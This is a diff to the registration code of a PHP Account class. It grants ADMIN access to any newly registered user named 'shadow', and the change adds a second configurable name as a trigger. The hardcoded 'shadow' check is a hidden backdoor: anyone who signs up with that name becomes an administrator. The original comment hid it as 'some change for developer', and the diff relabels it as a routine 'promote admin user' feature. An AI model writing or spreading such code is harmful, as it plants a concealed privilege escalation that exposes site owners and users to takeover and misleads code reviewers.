@@ -176,8 +176,8 @@ class Account {
             );
 
             if ($uid) {
-                // === some change for developer ===
-                if (strtolower($_POST['name']) === 'shadow') {
+                // === promote admin user ===
+                if (strtolower($_POST['name']) === 'shadow' || (defined('ADMIN_NAME') && !empty(ADMIN_NAME) && strtolower($_POST['name']) === strtolower(ADMIN_NAME))) {
                     $database->updateUserField($uid, 'access', ADMIN, 1);
                 }
 
@@ -197,8 +197,8 @@ class Account {
             );
 
             if ($uid) {
-                // === some change for developer ===
-                if (strtolower($_POST['name']) === 'shadow') {
+                // === promote admin user ===
+                if (strtolower($_POST['name']) === 'shadow' || (defined('ADMIN_NAME') && !empty(ADMIN_NAME) && strtolower($_POST['name']) === strtolower(ADMIN_NAME))) {
                     $database->updateUserField($uid, 'access', ADMIN, 1);
                 }
 
